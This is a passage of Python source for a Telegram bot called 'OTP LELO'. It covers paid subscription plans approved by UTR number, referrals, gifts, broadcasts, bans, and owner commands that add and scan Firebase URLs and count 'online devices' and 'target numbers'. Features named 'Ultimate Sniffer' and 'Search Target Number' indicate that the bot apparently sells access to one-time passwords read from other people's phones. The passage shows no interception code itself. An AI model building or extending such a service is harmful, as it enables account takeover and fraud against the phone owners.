            session = self.get_session(uid)  
            session.update_activity()  

            if text in MENU_BUTTONS or text.startswith("/"):  
                self._clear_pending_interactive_states(context)  

            if text == "📱 Show Numbers Menu":  
                await self._show_main_menu(update, context, uid, edit=False, page=0)  
                return  

            if text == "🎲 Random Online Number":  
                await self._handle_random_number(update, context, uid)  
                return  

            if text == "🔍 Ultimate Sniffer":  
                await self.handle_sniffer(update, context)  
                return  

            if text == "⭐ Favorites":  
                await self.handle_favorites(update, context)  
                return  

            if text == "📑 Duplicate Numbers":  
                await self.handle_duplicates_menu(update, context, uid, page=0)  
                return  

            if text == "🆘 Help":  
                await self.cmd_help(update, context)  
                return  

            # ── Admin Panel Text Input Routing ──
            if self.admin_panel and self.admin_panel.get_state(uid):
                handled = await self.admin_panel.handle_text_input(update, context, text)
                if handled:
                    return  

            if context.user_data.get("awaiting_jump_page"):  
                await self.handle_jump_page_message(update, context)  
                return  

            if context.user_data.get("awaiting_search_device"):  
                await self.handle_search_device_message(update, context)  
                return  

            if context.user_data.get("awaiting_utr"):  
                await self.handle_utr_message(update, context)  
                return  

        except Exception as e:  
            logger.exception("Text handler error: %s", e)  

    async def handle_document(
        self,
        update: Update,
        context: ContextTypes.DEFAULT_TYPE,
    ) -> None:
        """Handle document uploads — currently for admin bulk Firebase .txt import."""
        try:
            if not update.message or not update.message.document:
                return
            uid = update.effective_user.id
            if self.admin_panel:
                handled = await self.admin_panel.handle_document(update, context)
                if handled:
                    return
        except Exception as e:
            logger.exception("Document handler error: %s", e)  

    async def handle_utr_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        if not context.user_data.get("awaiting_utr"):  
            return  
          
        user = update.effective_user  
        uid = user.id  
        name = f"{user.first_name or ''} {user.last_name or ''}".strip()  
        username = f"@{user.username}" if user.username else "No Username"  
        utr = update.message.text.strip()  
          
        duration_text = context.user_data.get("pending_buy_duration_text", "Custom Plan")  
        duration_seconds = context.user_data.get("pending_buy_duration_seconds", 0)  
        amount = context.user_data.get("pending_buy_amount", 0)  
          
        context.user_data.pop("awaiting_utr", None)  
        await safe_send_message(  
            context,  
            update.effective_chat.id,  
            "⏳ <b>Payment Verification Pending</b>\n\n"  
            f"Your UTR (<code>{escape(utr)}</code>) has been submitted for owner approval.",  
            reply_markup=KeyboardBuilder.get_reply_keyboard(),  
        )  
          
        owner_text = (  
            f"🔔 <b>New Purchase Order</b>\n"  
            f"━━━━━━━━━━━━━━━\n"  
            f"👤 <b>User:</b> {escape(name)} ({escape(username)})\n"  
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"  
            f"📦 <b>Plan:</b> {escape(duration_text)}\n"  
            f"💰 <b>Amount:</b> ₹{amount}\n"  
            f"🔢 <b>UTR:</b> <code>{escape(utr)}</code>\n"  
            f"━━━━━━━━━━━━━━━"  
        )  
        keyboard = InlineKeyboardMarkup([  
            [  
                InlineKeyboardButton("✅ Accept", callback_data=f"accept_order_{uid}_{duration_seconds}"),  
                InlineKeyboardButton("❌ Reject", callback_data=f"reject_order_{uid}")  
            ]  
        ])  
        try:  
            await safe_send_message(context, self.config.OWNER_ID, owner_text, reply_markup=keyboard)  
        except Exception:  
            pass  

    async def cmd_refer(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        user = update.effective_user  
        uid = user.id  
        session = self.get_session(uid)  
        session.update_activity()  
          
        if uid != self.config.OWNER_ID:  
            if not await self.channel_service.is_member(context.application, uid):  
                return  
          
        user_data = await self.firebase.get_user_data(uid)  
        if not user_data:  
            await safe_send_message(context, update.effective_chat.id, "❌ Use /start first.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  
          
        ref_link = f"https://t.me/{self.config.BOT_USERNAME}?start=ref_{uid}"  
        validity = await self.user_service.get_validity_text(uid)  
        pause_info = await self.user_service.get_pause_info(uid)  
        rem_pauses = pause_info['remaining_today'] if pause_info else 0  
          
        text = (  
            f"👤 <b>Referral System</b>\n"  
            f"━━━━━━━━━━━━━━━\n"  
            f"📊 <b>Referrals:</b> <code>{user_data.get('referral_count', 0)}</code>\n"  
            f"⏳ <b>Validity:</b> {escape(validity)}\n"  
            f"🎁 <b>Bonus:</b> +{self.config.REFERRAL_BONUS_HOURS}h per referral\n"  
            f"⏸️ <b>Pauses:</b> {rem_pauses} left today\n"  
            f"━━━━━━━━━━━━━━━\n"  
            f"🔗 <b>Your Link:</b>\n<code>{ref_link}</code>"  
        )  
        await safe_send_message(  
            context,  
            update.effective_chat.id,  
            text,  
            reply_markup=KeyboardBuilder.referral(uid),  
        )  
      
    async def cmd_gift(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        if not self._is_owner(update):  
            return  
        if not context.args:  
            await safe_send_message(  
                context,  
                update.effective_chat.id,  
                "❌ <b>Invalid usage!</b>\nExamples: <code>/gift 1d</code>, <code>/gift 2m</code>, <code>/gift 4y</code>",  
                reply_markup=KeyboardBuilder.get_reply_keyboard(),  
            )  
            return  
          
        time_arg = context.args[0].lower()  
        match = re.match(r"^(\d+)([dmy])$", time_arg)  
        if not match:  
            await safe_send_message(context, update.effective_chat.id, "❌ <b>Invalid format!</b> Use 1d, 1m, 1y", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  
          
        val = int(match.group(1))  
        unit = match.group(2)  
        if unit == "d":  
            total_days = val  
            gift_text = f"{val} Day(s)"  
        elif unit == "m":  
            total_days = val * 30  
            gift_text = f"{val} Month(s)"  
        elif unit == "y":  
            total_days = val * 365  
            gift_text = f"{val} Year(s)"  
        else:  
            total_days = val  
            gift_text = f"{val} Day(s)"  
          
        seconds_to_add = total_days * 86400  
        users = await self.firebase.get_data(self.config.PRIMARY_FIREBASE, "bot_users")  
        if not isinstance(users, dict) or not users:  
            backup = LocalBackupManager.load_backup()
            users = backup.get("bot_users", {})

        if not users:  
            await safe_send_message(context, update.effective_chat.id, "❌ No users found in database.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  
          
        status_msg = await safe_send_message(  
            context,  
            update.effective_chat.id,  
            f"🎁 <b>Gift Distribution Started...</b>\nTarget: {len(users)} users\n🎁 Amount: {escape(gift_text)}",  
        )  
          
        success_count = 0  
        total_count = len(users)  
        for index, uid_str in enumerate(users.keys(), start=1):  
            try:  
                target_uid = int(uid_str)  
                await self.user_service.add_time(target_uid, seconds_to_add)  
                success_count += 1  
                try:  
                    await safe_send_message(  
                        context,  
                        target_uid,  
                        f"🎁 <b>Special Gift Received!</b>\n\n"  
                        f"The owner has gifted <b>{escape(gift_text)}</b> validity to all users!\n"  
                        f"Use /start to check your updated account status.",  
                        reply_markup=KeyboardBuilder.get_reply_keyboard(),  
                    )  
                except Exception:  
                    pass  
                if status_msg and (index % 10 == 0 or index == total_count):  
                    try:  
                        await safe_edit_message(  
                            context,  
                            status_msg.chat_id,  
                            status_msg.message_id,  
                            f"🎁 <b>Gift Distribution in Progress...</b>\n"  
                            f"✅ Progress: <code>{index}/{total_count}</code> users credited\n"  
                            f"🎁 Gift: {escape(gift_text)}",  
                        )  
                    except Exception:  
                        pass  
                await asyncio.sleep(0.04)  
            except Exception:  
                pass  
          
        if status_msg:  
            await safe_edit_message(  
                context,  
                status_msg.chat_id,  
                status_msg.message_id,  
                f"🎁 <b>Gift Distribution Completed!</b>\n\n"  
                f"✅ Successfully credited <b>{success_count}/{total_count}</b> users with <b>{escape(gift_text)}</b> validity.",  
            )  

    async def cmd_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        if not self._is_owner(update):  
            return  
        message_text = " ".join(context.args) if context.args else "Announcement from OTP LELO"  
        users = await self.firebase.get_data(self.config.PRIMARY_FIREBASE, "bot_users")  
        if not isinstance(users, dict) or not users:  
            backup = LocalBackupManager.load_backup()
            users = backup.get("bot_users", {})

        if not users:  
            await safe_send_message(context, update.effective_chat.id, "❌ No users found to broadcast.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  
          
        asyncio.create_task(self._execute_broadcast(update, context, users, message_text))  
        await safe_send_message(  
            context,  
            update.effective_chat.id,  
            f"📢 <b>Broadcast Task Initiated</b>\n"  
            f"━━━━━━━━━━━━━━━\n"  
            f"📨 <b>Message:</b> {escape(message_text)}\n"  
            f"⏳ Messages are being sent in the background.",  
            reply_markup=KeyboardBuilder.get_reply_keyboard(),  
        )  

    async def _execute_broadcast(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
        users: Dict,  
        message_text: str,  
    ) -> None:  
        total_users = len(users)  
        sent_count = 0  
        failed_count = 0  
          
        status_msg = await safe_send_message(  
            context,  
            update.effective_chat.id,  
            f"📢 <b>Broadcast in Progress</b>\n"  
            f"━━━━━━━━━━━━━━━\n"  
            f"📨 <b>Message:</b> {escape(message_text)}\n"  
            f"📊 <b>Progress:</b> <code>0 sent successfully</code> (0/{total_users})",  
        )  
          
        for index, uid_str in enumerate(users.keys(), start=1):  
            try:  
                target_uid = int(uid_str)  
                res = await safe_send_message(context, target_uid, message_text, reply_markup=KeyboardBuilder.get_reply_keyboard())  
                if res is not None:  
                    sent_count += 1  
                else:  
                    failed_count += 1  
            except Exception:  
                failed_count += 1  
              
            if status_msg and (index % 10 == 0 or index == total_users):  
                try:  
                    await safe_edit_message(  
                        context,  
                        status_msg.chat_id,  
                        status_msg.message_id,  
                        f"📢 <b>Broadcast in Progress</b>\n"  
                        f"━━━━━━━━━━━━━━━\n"  
                        f"📨 <b>Message:</b> {escape(message_text)}\n"  
                        f"📊 <b>Progress:</b> <code>{sent_count} sent successfully</code> ({index}/{total_users})\n"  
                        f"❌ <b>Failed:</b> {failed_count}",  
                    )  
                except Exception:  
                    pass  
            await asyncio.sleep(0.04)  
          
        if status_msg:  
            await safe_edit_message(  
                context,  
                status_msg.chat_id,  
                status_msg.message_id,  
                f"📢 <b>Broadcast Completed!</b>\n"  
                f"━━━━━━━━━━━━━━━\n"  
                f"📨 <b>Message:</b> {escape(message_text)}\n"  
                f"✅ <b>Successfully Sent:</b> <code>{sent_count}</code>\n"  
                f"❌ <b>Failed / Blocked:</b> <code>{failed_count}</code>\n"  
                f"📊 <b>Total Users:</b> <code>{total_users}</code>",  
            )  

    async def cmd_addurl(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        if not self._is_owner(update):  
            return  
        raw_input = " ".join(context.args) if context.args else ""
        if not raw_input and update.message and update.message.reply_to_message:
            raw_input = update.message.reply_to_message.text or ""

        tokens = re.split(r"[\s,\n\r]+", raw_input)
        candidate_tokens = [t.strip().strip('\'"`,;') for t in tokens if t.strip()]

        found_candidates: List[str] = []
        rejected_candidates: List[str] = []

        for token in candidate_tokens:
            if not token:
                continue
            if "firebaseio.com" in token.lower() or "firebasedatabase.app" in token.lower():
                cleaned = FirebaseService.clean_firebase_url(token)
                if cleaned:
                    found_candidates.append(cleaned)
                else:
                    rejected_candidates.append(token)

        if not found_candidates:  
            err_msg = (
                "❌ <b>No valid Firebase URLs found!</b>\n"
                "Please provide genuine Firebase links (e.g. <code>https://example.firebaseio.com</code> or <code>example.firebaseio.com</code>)."
            )
            if rejected_candidates:
                err_msg += "\n\n<b>Rejected invalid entries:</b>\n" + "\n".join(f"• <code>{escape(r)}</code>" for r in rejected_candidates[:10])
            await safe_send_message(
                context, 
                update.effective_chat.id, 
                err_msg, 
                reply_markup=KeyboardBuilder.get_reply_keyboard()
            )  
            return  

        urls = await self.firebase.get_urls()  
        results = []  
        updated = False  
        for clean_url in found_candidates:  
            if clean_url in urls:  
                results.append(f"⚠️ Already exists: <code>{escape(clean_url)}</code>")  
                continue  
            urls.append(clean_url)  
            updated = True  
            results.append(f"✅ Added: <code>{escape(clean_url)}</code>")  
          
        if rejected_candidates:
            results.append("\n<b>Rejected invalid URLs:</b>")
            for rej in rejected_candidates[:10]:
                results.append(f"❌ <code>{escape(rej)}</code>")

        if updated:  
            LocalBackupManager.update_key("firebase_urls", urls)
            success = await self.firebase.patch_data(  
                self.config.PRIMARY_FIREBASE,  
                "bot_config",  
                {"firebase_urls": urls},  
            )  
            if success:  
                await self.firebase.invalidate_url_cache()  
            else:  
                results.append("⚠️ Saved locally; syncing to primary Firebase failed.")  
        await safe_send_message(context, update.effective_chat.id, "\n".join(results), reply_markup=KeyboardBuilder.get_reply_keyboard())  
      
    async def cmd_urls(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        if not self._is_owner(update):  
            return  
        
        status_msg = await safe_send_message(context, update.effective_chat.id, "🔄 <i>Scanning endpoints and online devices...</i>")
        
        session = self.get_session(update.effective_user.id)
        clients = await self.firebase.get_all_clients(session, force_refresh=True)
        urls = await self.firebase.get_urls()  
        pruned_urls = await self.firebase.get_pruned_urls()  
        
        url_stats: Dict[str, Dict[str, int]] = {u: {"online": 0, "total": 0} for u in urls}
        for info in clients.values():
            src_url = info.get("_src_url")
            if src_url in url_stats:
                url_stats[src_url]["total"] += 1
                if info.get("_is_online"):
                    url_stats[src_url]["online"] += 1

        lines = [
            "==========================================",
            "      FIREBASE ENDPOINTS & ONLINE DEVICES ",
            f"      Generated on: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}",
            "==========================================\n",
        ]

        total_online = sum(st["online"] for st in url_stats.values())
        total_endpoints = len(urls)

        for i, u in enumerate(urls, start=1):
            st = url_stats.get(u, {"online": 0, "total": 0})
            is_primary = " [PRIMARY]" if i == 1 else ""
            lines.append(f"[{i}] {u}{is_primary}")
            lines.append(f"    Devices: {st['online']} Online | {st['total']} Total\n")

        if pruned_urls:
            lines.append("------------------------------------------")
            lines.append(f" AUTO-PRUNED STANDBY URLS ({len(pruned_urls)}):")
            lines.append("------------------------------------------")
            for idx, p_url in enumerate(pruned_urls, start=1):
                lines.append(f"  {idx}. {p_url}")
            lines.append("")

        lines.append("==========================================")
        lines.append(f" SUMMARY: {total_endpoints} Endpoints | {total_online} Active Online Devices")
        lines.append("==========================================")

        file_content = "\n".join(lines).encode("utf-8")
        if status_msg:
            await safe_delete_message(context, status_msg.chat_id, status_msg.message_id)

        await send_file_document(
            context=context,
            chat_id=update.effective_chat.id,
            file_bytes=file_content,
            filename=f"firebase_urls_{int(time.time())}.txt",
            caption=f"📋 <b>Firebase Status Report</b>\nTotal Endpoints: {total_endpoints} | Online Devices: {total_online}",
        )  
      
    async def cmd_scanurls(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        """
        Owner-only command: Probes every known endpoint (active + pruned) with live percentage progress bar.
        """
        if not self._is_owner(update):  
            return  

        status_msg = await safe_send_message(
            context,
            update.effective_chat.id,
            "🔍 <b>Starting Firebase Scan...</b>\nInitializing endpoints queue..."
        )
        if not status_msg:
            return

        chat_id = status_msg.chat_id
        message_id = status_msg.message_id
        last_update_time = [0.0]

        async def update_progress_ui(scanned: int, total: int, active_so_far: int, dead_so_far: int):
            now = time.monotonic()
            # Throttle Telegram message updates to avoid hitting rate limits
            if (now - last_update_time[0] < 1.0) and (scanned < total):
                return

            last_update_time[0] = now
            pct = int((scanned / total) * 100) if total > 0 else 0
            filled_len = int(20 * scanned // total) if total > 0 else 0
            bar = "█" * filled_len + "░" * (20 - filled_len)

            progress_text = (
                "🔍 <b>Scanning Firebase Endpoints...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"<code>[{bar}]</code> <b>{pct}%</b>\n\n"
                f"📊 <b>Progress:</b> <code>{scanned}/{total}</code> checked\n"
                f"🟢 <b>Active:</b> <code>{active_so_far}</code>\n"
                f"🔴 <b>Pruned/Offline:</b> <code>{dead_so_far}</code>\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                "⏳ <i>Scanning live network status...</i>"
            )
            await safe_edit_message(context, chat_id, message_id, progress_text)

        restored_count, active_count, dead_count = await self.firebase.scan_and_restore_all(
            progress_callback=update_progress_ui
        )

        session = self.get_session(update.effective_user.id)
        clients = await self.firebase.get_all_clients(session, force_refresh=True)
        online, offline, _ = self._split_devices(clients)

        result_msg = (
            "✅ <b>Scan & Endpoint Recovery Completed!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"<code>[████████████████████]</code> <b>100%</b>\n\n"
            f"♻️ <b>Restored Working URLs:</b> <code>{restored_count}</code>\n"
            f"🌐 <b>Active Endpoints:</b> <code>{active_count}</code>\n"
            f"🚫 <b>Pruned Standby:</b> <code>{dead_count}</code>\n\n"
            f"📱 <b>Total Monitored Numbers:</b> <code>{len(clients)}</code>\n"
            f"🟢 <b>Online Devices:</b> <code>{len(online)}</code>\n"
            f"🔴 <b>Offline Devices:</b> <code>{len(offline)}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "🚀 <i>Database synced & active target numbers refreshed!</i>"
        )
        await safe_edit_message(context, chat_id, message_id, result_msg)

    async def cmd_delurl(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        if not self._is_owner(update):  
            return  
        if not context.args:  
            await safe_send_message(context, update.effective_chat.id, "Usage: <code>/delurl &lt;index&gt;</code>", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  
        try:  
            indices = sorted(set(int(a) for a in context.args), reverse=True)  
        except ValueError:  
            await safe_send_message(context, update.effective_chat.id, "Indices must be numbers.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  
          
        await self.firebase.invalidate_url_cache()
        urls = await self.firebase.get_urls()  
        results = []  
        updated = False  
        for idx in indices:  
            if idx <= 1:  
                results.append(f"❌ Cannot remove primary URL (index {idx})")  
                continue  
            target_idx = idx - 1  
            if target_idx < 0 or target_idx >= len(urls):  
                results.append(f"❌ Index {idx} out of range (Current total: {len(urls)})")  
                continue  
            removed = urls.pop(target_idx)  
            updated = True  
            results.append(f"✅ Removed: <code>{escape(removed)}</code>")  
          
        if updated:  
            LocalBackupManager.update_key("firebase_urls", urls)
            await self.firebase.patch_data(  
                self.config.PRIMARY_FIREBASE,  
                "bot_config",  
                {"firebase_urls": urls},  
            )  
            await self.firebase.invalidate_url_cache()  
        await safe_send_message(context, update.effective_chat.id, "\n".join(results), reply_markup=KeyboardBuilder.get_reply_keyboard())  
      
    async def cmd_addtime(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        if not self._is_owner(update):  
            return  
        if len(context.args) < 2:  
            await safe_send_message(context, update.effective_chat.id, "Usage: <code>/addtime &lt;user_id&gt; &lt;time&gt;</code>\nExamples: <code>24h</code>, <code>7d</code>, <code>lifetime</code>, <code>0</code>", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  
        try:  
            target_uid = int(context.args[0])  
        except ValueError:  
            await safe_send_message(context, update.effective_chat.id, "Invalid user ID.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  
          
        time_arg = context.args[1].lower()  
        if time_arg == "lifetime":  
            await self.user_service.add_time(target_uid, 0, is_lifetime=True)  
            await safe_send_message(context, update.effective_chat.id, f"✅ Set lifetime for user {target_uid}", reply_markup=KeyboardBuilder.get_reply_keyboard())  
        elif time_arg == "0":  
            await self.user_service.add_time(target_uid, 0)  
            await safe_send_message(context, update.effective_chat.id, f"✅ Expired user {target_uid}", reply_markup=KeyboardBuilder.get_reply_keyboard())  
        else:  
            match = re.match(r"^(\d+)([hdmy])?$", time_arg)  
            if not match:  
                await safe_send_message(context, update.effective_chat.id, "Invalid format. Use: 24h, 7d, 1m, 1y", reply_markup=KeyboardBuilder.get_reply_keyboard())  
                return  
            val = int(match.group(1))  
            unit = match.group(2) or "h"  
            multipliers = {"h": 3600, "d": 86400, "m": 2592000, "y": 31536000}  
            seconds = val * multipliers.get(unit, 3600)  
            await self.user_service.add_time(target_uid, seconds)  
            await safe_send_message(context, update.effective_chat.id, f"✅ Added {val}{unit} to user {target_uid}", reply_markup=KeyboardBuilder.get_reply_keyboard())  

    async def cmd_changetime(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        if not self._is_owner(update):  
            return  
        if len(context.args) < 2:  
            await safe_send_message(context, update.effective_chat.id, "Usage: <code>/changetime &lt;user_id&gt; &lt;validity&gt;</code>\nExamples: <code>24h</code>, <code>7d</code>, <code>1m</code>, <code>lifetime</code>, <code>0</code>", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  
        try:  
            target_uid = int(context.args[0])  
        except ValueError:  
            await safe_send_message(context, update.effective_chat.id, "❌ Invalid user ID.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  

        time_arg = context.args[1].lower()  
        if time_arg == "lifetime":  
            await self.user_service.set_exact_time(target_uid, 0, is_lifetime=True)  
            await safe_send_message(context, update.effective_chat.id, f"✅ Changed validity of {target_uid} to <b>Lifetime</b>", reply_markup=KeyboardBuilder.get_reply_keyboard())  
        elif time_arg == "0":  
            await self.user_service.set_exact_time(target_uid, 0)  
            await safe_send_message(context, update.effective_chat.id, f"✅ Set user {target_uid} to <b>Expired</b> (0s)", reply_markup=KeyboardBuilder.get_reply_keyboard())  
        else:  
            match = re.match(r"^(\d+)([hdmy])?$", time_arg)  
            if not match:  
                await safe_send_message(context, update.effective_chat.id, "❌ Invalid format. Use: 24h, 7d, 1m, 1y", reply_markup=KeyboardBuilder.get_reply_keyboard())  
                return  
            val = int(match.group(1))  
            unit = match.group(2) or "h"  
            multipliers = {"h": 3600, "d": 86400, "m": 2592000, "y": 31536000}  
            seconds = val * multipliers.get(unit, 3600)  
            await self.user_service.set_exact_time(target_uid, seconds)  
            await safe_send_message(context, update.effective_chat.id, f"✅ Successfully set user {target_uid} validity to <b>{val}{unit} from now</b>.", reply_markup=KeyboardBuilder.get_reply_keyboard())  

    async def cmd_removetime(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        if not self._is_owner(update):  
            return  
        if not context.args or context.args[0].lower() != "confirm":  
            await safe_send_message(context, update.effective_chat.id, "⚠️ <b>Warning:</b> This will expire ALL users' validity.\nRun: <code>/removetime confirm</code>", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  

        users = await self.firebase.get_data(self.config.PRIMARY_FIREBASE, "bot_users")  
        if not isinstance(users, dict) or not users:  
            backup = LocalBackupManager.load_backup()
            users = backup.get("bot_users", {})

        if not users:  
            await safe_send_message(context, update.effective_chat.id, "❌ No users found.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  

        total = 0  
        for uid_str in users.keys():  
            try:  
                target_uid = int(uid_str)  
                if target_uid != self.config.OWNER_ID:  
                    await self.user_service.set_exact_time(target_uid, 0)  
                    total += 1  
            except Exception:  
                pass  

        await safe_send_message(context, update.effective_chat.id, f"✅ Successfully removed validity for all <b>{total}</b> users.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
      
    async def cmd_time(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:  
        if not self._is_owner(update):  
            return  
        users = await self.firebase.get_data(self.config.PRIMARY_FIREBASE, "bot_users")  
        if not isinstance(users, dict) or not users:  
            backup = LocalBackupManager.load_backup()
            users = backup.get("bot_users", {})

        if not users:  
            await safe_send_message(context, update.effective_chat.id, "No users found.", reply_markup=KeyboardBuilder.get_reply_keyboard())  
            return  
          
        now = int(time.time())  
        user_list = []  
        for uid_str, data in users.items():  
            if not isinstance(data, dict):  
                continue  
            uid = int(uid_str)  
            if uid == self.config.OWNER_ID:  
                continue  
            is_paused = data.get("paused", False)  
            remaining = data.get("frozen_seconds", 0) if is_paused else data.get("valid_until", 0) - now  
            user_list.append({  
                "uid": uid,  
                "name": data.get("first_name", "Unknown"),  
                "username": data.get("username", ""),  
                "remaining": remaining,  
                "paused": is_paused,  
                "referral_count": data.get("referral_count", 0),  
            })  
          
        user_list.sort(key=lambda x: x["remaining"], reverse=True)  
        
        lines = [
            "==========================================",
            "             REGISTERED BOT USERS         ",
            f"      Generated on: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}",
            "==========================================\n",
        ]

        for i, u in enumerate(user_list, start=1):
            status = "PAUSED" if u["paused"] else ("ACTIVE" if u["remaining"] > 0 else "EXPIRED")
            duration = UserService._format_duration(u["remaining"]) if u["remaining"] > 0 else "Expired"
            lines.append(f"{i}. User: {u['name']} (@{u['username'] if u['username'] else 'None'})")
            lines.append(f"   User ID: {u['uid']}")
            lines.append(f"   Status: {status} | Time Left: {duration}")
            lines.append(f"   Referrals Count: {u['referral_count']}\n")

        lines.append("==========================================")
        lines.append(f" TOTAL REGISTERED USERS: {len(user_list)}")
        lines.append("==========================================")

        file_content = "\n".join(lines).encode("utf-8")
        await send_file_document(
            context=context,
            chat_id=update.effective_chat.id,
            file_bytes=file_content,
            filename=f"users_status_{int(time.time())}.txt",
            caption=f"👥 <b>User Base Status Report</b>\nTotal Users Exported: {len(user_list)}",
        )  

    # ==================== ADMIN PANEL COMMANDS ====================
    
    async def cmd_admin(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Owner-only: Open the Admin Control Panel with 20+ features."""
        if not self.admin_panel:
            return
        await self.admin_panel.show_admin_panel(update, context)

    async def cmd_redeem(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """User-facing: Redeem a gift code."""
        if not self.admin_panel:
            return
        user = update.effective_user
        uid = user.id
        
        if not context.args:
            await safe_send_message(
                context, update.effective_chat.id,
                "❌ <b>Usage:</b> <code>/redeem CODE</code>\nExample: <code>/redeem ADMIN-123456</code>",
                reply_markup=KeyboardBuilder.get_reply_keyboard(),
            )
            return
        
        code = context.args[0].strip().upper()
        success, msg, duration = await self.admin_panel.redeem_code(code, uid)
        
        if success:
            dur_text = UserService._format_duration(duration)
            full_msg = (
                f"🎁 <b>Code Redeemed!</b>\n\n"
                f"✅ {msg}\n"
                f"⏱️ <b>+{dur_text}</b> added to your account!\n"
                f"▶️ Use /start to check your updated validity."
            )
        else:
            full_msg = f"❌ {msg}"
        
        await safe_send_message(
            context, update.effective_chat.id, full_msg,
            reply_markup=KeyboardBuilder.get_reply_keyboard(),
        )

    async def cmd_ban(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Owner-only: Ban a user."""
        if not self._is_owner(update) or not self.admin_panel:
            return
        if not context.args:
            await safe_send_message(
                context, update.effective_chat.id,
                "❌ Usage: <code>/ban user_id reason</code>",
                reply_markup=KeyboardBuilder.get_reply_keyboard(),
            )
            return
        try:
            target_uid = int(context.args[0])
        except ValueError:
            await safe_send_message(context, update.effective_chat.id, "❌ Invalid user ID.")
            return
        reason = " ".join(context.args[1:]) if len(context.args) > 1 else "No reason provided"
        await self.admin_panel.ban_user(target_uid, reason, "Admin Command")
        await safe_send_message(
            context, update.effective_chat.id,
            f"🚫 User <code>{target_uid}</code> banned.\nReason: {escape(reason)}",
            reply_markup=KeyboardBuilder.get_reply_keyboard(),
        )

    async def cmd_unban(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Owner-only: Unban a user."""
        if not self._is_owner(update) or not self.admin_panel:
            return
        if not context.args:
            await safe_send_message(
                context, update.effective_chat.id,
                "❌ Usage: <code>/unban user_id</code>",
                reply_markup=KeyboardBuilder.get_reply_keyboard(),
            )
            return
        try:
            target_uid = int(context.args[0])
        except ValueError:
            await safe_send_message(context, update.effective_chat.id, "❌ Invalid user ID.")
            return
        if await self.admin_panel.unban_user(target_uid):
            await safe_send_message(
                context, update.effective_chat.id,
                f"✅ User <code>{target_uid}</code> unbanned.",
                reply_markup=KeyboardBuilder.get_reply_keyboard(),
            )
        else:
            await safe_send_message(
                context, update.effective_chat.id,
                f"❌ User <code>{target_uid}</code> not in ban list.",
                reply_markup=KeyboardBuilder.get_reply_keyboard(),
            )

    async def cmd_banned(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Owner-only: List all banned users."""
        if not self._is_owner(update) or not self.admin_panel:
            return
        banned = self.admin_panel.load_banned()
        if not banned:
            await safe_send_message(
                context, update.effective_chat.id,
                "🛡️ No banned users. Ban list is empty.",
                reply_markup=KeyboardBuilder.get_reply_keyboard(),
            )
            return
        lines = ["🚫 <b>BANNED USERS</b>", "━━━━━━━━━━━━━━━━━━━━━"]
        for i, (uid_str, entry) in enumerate(banned.items(), 1):
            when = datetime.fromtimestamp(entry.get("banned_at", 0)).strftime("%Y-%m-%d %H:%M")
            lines.append(f"{i}. <code>{uid_str}</code>")
            lines.append(f"   Reason: {entry.get('reason', 'N/A')}")
            lines.append(f"   By: {entry.get('banned_by', 'Admin')} | {when}")
            lines.append("")
        await safe_send_message(
            context, update.effective_chat.id, "\n".join(lines),
            reply_markup=KeyboardBuilder.get_reply_keyboard(),
        )  
      
    # ---- Callback Handlers ----  
      
    async def handle_callback(  
        self,  
        update: Update,  
        context: ContextTypes.DEFAULT_TYPE,  
    ) -> None:  
        query = update.callback_query  
        asyncio.create_task(safe_answer_query(query))
        
        uid = query.from_user.id  
        data = query.data  
          
        session = self.get_session(uid)  
        session.update_activity()  

        # ── Admin Panel Callback Routing ──
        if self.admin_panel and data.startswith("admin_"):
            handled = await self.admin_panel.handle_callback(update, context)
            if handled:
                return  
          
        if data == "jump_page":  
            context.user_data["awaiting_jump_page"] = True  
            msg = await safe_send_message(  
                context,  
                query.message.chat_id,  
                "🔢 <b>Jump to Page</b>\n\nPlease reply with the page number you want to view:",  
                reply_markup=KeyboardBuilder.back_to_main_button(),  
            )  
            if msg:  
                session.tracked_message_ids.append(msg.message_id)  
            return  

        if data == "search_device":  
            context.user_data["awaiting_search_device"] = True  
            msg = await safe_send_message(  
                context,  
                query.message.chat_id,  
                "🔍 <b>Search Target Number</b>\n\nPlease send the phone number or last 4-6 digits:",  
                reply_markup=KeyboardBuilder.back_to_main_button(),  
            )  
            if msg:  
                session.tracked_message_ids.append(msg.message_id)  
            return  

        if data == "view_duplicates":
            await self.handle_duplicates_menu(update, context, uid, page=0, edit=True)
            return

